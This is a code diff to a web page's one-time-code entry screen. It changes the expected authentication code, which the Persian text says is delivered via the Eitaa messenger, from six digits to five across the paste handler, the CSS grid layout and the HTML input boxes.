@@ -59,7 +59,7 @@ function updateCode(){const complete=codeValue().length>=5;codeButton.disabled=!
 codeInputs.forEach((input,index)=>{
   input.addEventListener("input",()=>{input.value=englishDigits(input.value).replace(/\D/g,"").slice(-1);if(input.value&&index<codeInputs.length-1)codeInputs[index+1].focus();updateCode();});
   input.addEventListener("keydown",event=>{if(event.key==="Backspace"&&!input.value&&index>0)codeInputs[index-1].focus();if(event.key==="Enter"&&!codeButton.disabled)codeButton.click();});
-  input.addEventListener("paste",event=>{event.preventDefault();const digits=englishDigits(event.clipboardData.getData("text")).replace(/\D/g,"").slice(0,6);digits.split("").forEach((digit,i)=>{if(codeInputs[i])codeInputs[i].value=digit;});codeInputs[Math.min(digits.length,5)].focus();updateCode();});
+  input.addEventListener("paste",event=>{event.preventDefault();const digits=englishDigits(event.clipboardData.getData("text")).replace(/\D/g,"").slice(0,5);digits.split("").forEach((digit,i)=>{if(codeInputs[i])codeInputs[i].value=digit;});codeInputs[Math.min(digits.length,4)].focus();updateCode();});
 });
 function openCodeScreen(){showScreen("code",2);codeInputs.forEach(input=>input.value="");updateCode();startResendTimer();setTimeout(()=>codeInputs[0].focus(),100);}
 codeButton.addEventListener("click",async()=>{
@@ -387,7 +387,7 @@ label{margin-bottom:8px;color:#425e6c;font-size:11px;font-weight:800}
   background:transparent
 }
 
-.codeBoxes{direction:ltr;display:grid;grid-template-columns:repeat(6,1fr);gap:8px}
+.codeBoxes{direction:ltr;display:grid;grid-template-columns:repeat(5,1fr);gap:8px}
 
 .codeBoxes input{
   width:100%;
@@ -540,9 +540,8 @@ footer{color:#9babb3;text-align:center;font-size:9px}
     <div class="screen" id="codeScreen">
       <div class="formIcon">✉</div>
       <h2>کد احراز هویت ارسال شد</h2>
-      <p class="description">کد احراز هویت پلتفرم به ایتای شما ارسال شد. کد شش‌رقمی را در کادرهای زیر وارد کنید.</p>
+      <p class="description">کد احراز هویت پلتفرم به ایتای شما ارسال شد. کد پنج‌رقمی را در کادرهای زیر وارد کنید.</p>
       <div class="codeBoxes" id="codeBoxes">
-        <input type="tel" inputmode="numeric" maxlength="1">
         <input type="tel" inputmode="numeric" maxlength="1">
         <input type="tel" inputmode="numeric" maxlength="1">
         <input type="tel" inputmode="numeric" maxlength="1">
